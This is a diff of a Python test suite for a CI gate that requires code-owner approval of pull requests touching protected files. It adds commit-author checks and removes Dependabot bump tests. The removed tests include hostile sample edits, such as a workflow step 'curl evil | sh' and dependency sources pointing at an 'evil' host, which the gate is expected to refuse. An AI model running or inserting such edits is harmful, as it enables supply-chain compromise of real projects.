@@ -160,10 +160,30 @@ def _pr(
     return {
         "state": state,
         "user": {"login": login, "type": kind},
+        "commits": 1,
         "changed_files": changed,
         "head": {"sha": head, "repo": {"id": 2 if outside else 1}},
         "base": {"repo": {"id": 1}},
     }
+
+
+_SAME = "<author>"
+
+
+def _commit(author: str | None, committer: str | None = _SAME) -> dict:
+    committer = author if committer == _SAME else committer
+    return {
+        "author": None if author is None else {"login": author},
+        "committer": None if committer is None else {"login": committer},
+    }
+
+
+def _decide(roots: tr.TrustRoots, pr: dict, files: list, reviews: list, commits: list | None = None) -> str:
+    """`decide` with, by default, one commit the PR's own author made."""
+    if commits is None:
+        user = pr.get("user")
+        commits = [_commit(user.get("login") if isinstance(user, dict) else None)]
+    return tr.decide(roots, pr, files, reviews, commits)
 
 
 def _review(login: str, state: str, commit: str = HEAD) -> dict:
@@ -179,7 +199,7 @@ class Decision(unittest.TestCase):
 
     def refused(self, pr: dict, files: list, reviews: list, needle: str) -> None:
         with self.assertRaises(tr.Refused) as cm:
-            tr.decide(self.roots, pr, files, reviews)
+            _decide(self.roots, pr, files, reviews)
         self.assertIn(needle, str(cm.exception))
 
     def test_fork_touching_trust_root_without_review_fails(self) -> None:
@@ -227,7 +247,7 @@ class Decision(unittest.TestCase):
 
     def test_deleted_account_review_is_skipped(self) -> None:
         reviews = [{"user": None, "state": "CHANGES_REQUESTED", "commit_id": HEAD}, _review("owner", "APPROVED")]
-        self.assertIn("approved", tr.decide(self.roots, _pr(), [{"filename": "Cargo.toml"}], reviews))
+        self.assertIn("approved", _decide(self.roots, _pr(), [{"filename": "Cargo.toml"}], reviews))
 
     def test_deleted_account_approval_does_not_count(self) -> None:
         reviews = [{"user": None, "state": "APPROVED", "commit_id": HEAD}]
@@ -235,20 +255,20 @@ class Decision(unittest.TestCase):
 
     def test_fork_with_owner_approval_at_head_passes(self) -> None:
         reviews = [_review("OWNER", "CHANGES_REQUESTED", OTHER), _review("owner", "COMMENTED"), _review("owner", "APPROVED")]
-        self.assertIn("approved", tr.decide(self.roots, _pr(), [{"filename": "Cargo.toml"}], reviews))
+        self.assertIn("approved", _decide(self.roots, _pr(), [{"filename": "Cargo.toml"}], reviews))
 
     def test_later_comment_keeps_approval(self) -> None:
         reviews = [_review("owner", "APPROVED"), _review("owner", "COMMENTED", OTHER)]
-        self.assertIn("approved", tr.decide(self.roots, _pr(), [{"filename": "Cargo.toml"}], reviews))
+        self.assertIn("approved", _decide(self.roots, _pr(), [{"filename": "Cargo.toml"}], reviews))
 
     def test_fork_not_touching_trust_root_passes(self) -> None:
-        self.assertIn("no trust root", tr.decide(self.roots, _pr(), [{"filename": "src/x.rs"}], []))
+        self.assertIn("no trust root", _decide(self.roots, _pr(), [{"filename": "src/x.rs"}], []))
 
     def test_same_repo_branch_of_non_owner_fails(self) -> None:
         self.refused(_pr(outside=False), [{"filename": "Cargo.toml"}], [], "without a code owner")
 
     def test_same_repo_branch_of_owner_passes(self) -> None:
-        out = tr.decide(self.roots, _pr(outside=False, login="Owner"), [{"filename": "Cargo.toml"}], [])
+        out = _decide(self.roots, _pr(outside=False, login="Owner"), [{"filename": "Cargo.toml"}], [])
         self.assertIn("code owner Owner", out)
 
     def test_owner_from_fork_still_needs_approval(self) -> None:
@@ -268,136 +288,44 @@ class Decision(unittest.TestCase):
             pr["user"] = {"login": login, "type": kind}
             self.refused(pr, [{"filename": "Cargo.toml"}], [], "malformed")
 
+    def test_owner_pr_carrying_another_accounts_commit_fails(self) -> None:
+        pr = _pr(outside=False, login="Owner")
+        pr["commits"] = 2
+        for other in [
+            _commit("someone"),
+            _commit("owner", "someone"),
+            _commit("web-flow"),
+            _commit("renovate[bot]"),
+            _commit(None, "owner"),
+            _commit("owner", None),
+        ]:
+            self.refused_with(pr, [_commit("owner"), other])
+
+    def test_owner_pr_with_partial_commit_list_fails(self) -> None:
+        pr = _pr(outside=False, login="Owner")
+        pr["commits"] = 2
+        self.refused_with(pr, [_commit("owner")])
+        pr["commits"] = tr.MAX_PR_COMMITS + 1
+        self.refused_with(pr, [_commit("owner")] * (tr.MAX_PR_COMMITS + 1))
+
+    def test_owner_pr_with_github_side_committers_passes(self) -> None:
+        pr = _pr(outside=False, login="Owner")
+        pr["commits"] = 2
+        commits = [_commit("owner", "web-flow"), _commit("github-actions[bot]")]
+        self.assertIn("code owner", _decide(self.roots, pr, [{"filename": "Cargo.toml"}], [], commits))
+
+    def test_non_owner_pr_of_owner_commits_fails(self) -> None:
+        self.refused_with(_pr(outside=False, login="someone"), [_commit("owner")])
+
+    def refused_with(self, pr: dict, commits: list) -> None:
+        with self.assertRaises(tr.Refused) as cm:
+            _decide(self.roots, pr, [{"filename": "Cargo.toml"}], [], commits)
+        self.assertIn("without a code owner", str(cm.exception))
+
     def test_untouched_trust_roots_ignore_author(self) -> None:
         pr = _pr(outside=False)
         pr["user"] = None
-        self.assertIn("no trust root", tr.decide(self.roots, pr, [{"filename": "src/x.rs"}], []))
-
-
-LOCK_BUMP = """@@ -10,7 +10,7 @@
- [[package]]
- name = "toml_edit"
--version = "0.22.27"
-+version = "0.25.1"
- source = "registry+https://github.com/rust-lang/crates.io-index"
--checksum = "%s"
-+checksum = "%s"
- dependencies = [
-""" % ("1" * 64, "2" * 64)
-MANIFEST_BUMP = '@@ -3,3 +3,3 @@\n [dependencies]\n-toml_edit = "0.22"\n+toml_edit = "0.25"\n serde = "1"'
-PIN = "actions/download-artifact@" + "b" * 40 + " # v7"
-PIN_BUMP = "@@ -9,3 +9,3 @@\n steps:\n-      - uses: %s\n+      - uses: %s\n" % (
-    PIN,
-    "actions/download-artifact@" + "c" * 40 + " # v8.0.1",
-)
-
-
-def _bot_pr(changed: int = 1) -> dict:
-    return _pr(outside=False, changed=changed, login="dependabot[bot]", kind="Bot")
-
-
-class DependabotBump(unittest.TestCase):
-    """Dependabot passes without review only for a diff shaped like a version
-    bump; every other edit it (or a push onto its branch) makes needs the
-    code owner, as any other author's does."""
-
-    def setUp(self) -> None:
-        self.roots = _roots("/.github/ @Owner\nCargo.toml @Owner\nCargo.lock @Owner\n")
-
-    def passes(self, files: list) -> None:
-        self.assertIn("Dependabot", tr.decide(self.roots, _bot_pr(len(files)), files, []))
-
-    def refused(self, files: list, pr: dict | None = None) -> None:
-        with self.assertRaises(tr.Refused) as cm:
-            tr.decide(self.roots, pr or _bot_pr(), files, [])
-        self.assertIn("without a code owner", str(cm.exception))
-
-    def test_manifest_and_lock_bump_passes(self) -> None:
-        self.passes(
-            [
-                {"filename": "src/ipe-cli/Cargo.toml", "patch": MANIFEST_BUMP},
-                {"filename": "Cargo.lock", "patch": LOCK_BUMP},
-            ]
-        )
-
-    def test_inline_table_version_bump_passes(self) -> None:
-        patch = '@@ -1 +1 @@\n-serde = { version = "1.0.1", features = ["derive"] }\n+serde = { version = "1.0.2", features = ["derive"] }'
-        self.passes([{"filename": "Cargo.toml", "patch": patch}])
-
-    def test_action_pin_bump_passes(self) -> None:
-        self.passes([{"filename": ".github/workflows/ci.yml", "patch": PIN_BUMP}])
-
-    def test_other_bot_is_not_dependabot(self) -> None:
-        pr = _pr(outside=False, login="renovate[bot]", kind="Bot")
-        self.refused([{"filename": ".github/workflows/ci.yml", "patch": PIN_BUMP}], pr)
-
-    def test_user_named_dependabot_is_not_dependabot(self) -> None:
-        pr = _pr(outside=False, login="dependabot[bot]", kind="User")
-        self.refused([{"filename": ".github/workflows/ci.yml", "patch": PIN_BUMP}], pr)
-
-    def test_dependabot_from_fork_is_not_trusted(self) -> None:
-        pr = _pr(outside=True, login="dependabot[bot]", kind="Bot")
-        self.refused([{"filename": ".github/workflows/ci.yml", "patch": PIN_BUMP}], pr)
-
-    def test_missing_patch_fails(self) -> None:
-        self.refused([{"filename": "Cargo.lock"}])
-
-    def test_non_manifest_trust_root_fails(self) -> None:
-        patch = "@@ -1 +1 @@\n-* @Owner\n+* @someone"
-        self.refused([{"filename": ".github/CODEOWNERS", "patch": patch}])
-
-    def test_workflow_edit_that_is_not_a_pin_fails(self) -> None:
-        patch = "@@ -1 +1 @@\n-      run: cargo test\n+      run: curl evil | sh"
-        self.refused([{"filename": ".github/workflows/ci.yml", "patch": patch}])
-
-    def test_workflow_action_swap_fails(self) -> None:
-        patch = "@@ -1 +1 @@\n-      - uses: %s\n+      - uses: %s" % (PIN, "evil/download-artifact@" + "c" * 40)
-        self.refused([{"filename": ".github/workflows/ci.yml", "patch": patch}])
-
-    def test_workflow_unpinned_action_fails(self) -> None:
-        patch = "@@ -1 +1 @@\n-      - uses: %s\n+      - uses: actions/download-artifact@v8" % PIN
-        self.refused([{"filename": ".github/workflows/ci.yml", "patch": patch}])
-
-    def test_workflow_added_step_fails(self) -> None:
-        patch = "@@ -1 +1,2 @@\n-      - uses: %s\n+      - uses: %s\n+      - uses: %s" % (PIN, PIN, PIN)
-        self.refused([{"filename": ".github/workflows/ci.yml", "patch": patch}])
-
-    def test_nested_workflow_path_fails(self) -> None:
-        self.refused([{"filename": ".github/workflows/sub/ci.yml", "patch": PIN_BUMP}])
-
-    def test_manifest_source_change_fails(self) -> None:
-        for new in [
-            'toml_edit = { git = "https://evil/x", version = "0.25" }',
-            'toml_edit = { path = "../x", version = "0.25" }',
-            'toml_edit = { version = "0.25", package = "evil" }',
-            'toml_edit = { version = "0.25", registry = "evil" }',
-        ]:
-            patch = '@@ -1 +1 @@\n-toml_edit = { version = "0.22" }\n+' + new
-            self.refused([{"filename": "Cargo.toml", "patch": patch}])
-
-    def test_manifest_build_script_fails(self) -> None:
-        patch = '@@ -1 +1 @@\n-build = "a.rs"\n+build = "b.rs"'
-        self.refused([{"filename": "Cargo.toml", "patch": patch}])
-
-    def test_manifest_feature_change_fails(self) -> None:
-        patch = '@@ -1 +1 @@\n-serde = { version = "1", features = ["a"] }\n+serde = { version = "2", features = ["b"] }'
-        self.refused([{"filename": "Cargo.toml", "patch": patch}])
-
-    def test_manifest_digit_feature_swap_fails(self) -> None:
-        patch = '@@ -1 +1 @@\n-serde = { version = "1", features = ["2018"] }\n+serde = { version = "1", features = ["2021"] }'
-        self.refused([{"filename": "Cargo.toml", "patch": patch}])
-
-    def test_manifest_added_dependency_fails(self) -> None:
-        patch = '@@ -1 +1,2 @@\n serde = "1"\n+evil = "1"'
-        self.refused([{"filename": "Cargo.toml", "patch": patch}])
-
-    def test_lock_non_crates_io_source_fails(self) -> None:
-        patch = '@@ -1 +1 @@\n-source = "registry+https://github.com/rust-lang/crates.io-index"\n+source = "git+https://evil/x#abc"'
-        self.refused([{"filename": "Cargo.lock", "patch": patch}])
-
-    def test_rename_away_from_trust_root_fails(self) -> None:
-        files = [{"filename": "docs/ci.yml", "previous_filename": ".github/workflows/ci.yml", "patch": PIN_BUMP}]
-        self.refused(files)
+        self.assertIn("no trust root", _decide(self.roots, pr, [{"filename": "src/x.rs"}], []))
 
 
 class EventRouting(unittest.TestCase):
